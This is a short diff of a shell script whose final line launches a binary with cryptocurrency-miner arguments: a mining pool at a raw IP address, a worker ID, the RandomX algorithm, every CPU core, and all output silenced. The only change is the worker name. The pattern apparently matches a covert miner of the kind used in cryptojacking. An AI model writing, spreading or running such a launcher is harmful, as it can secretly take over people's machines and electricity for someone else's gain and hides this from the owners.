@@ -25,4 +25,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -o 50.116.14.118:8088 -u pavantym.lofddtys321 -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o 50.116.14.118:8088 -u pavantym.feb191230 -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1
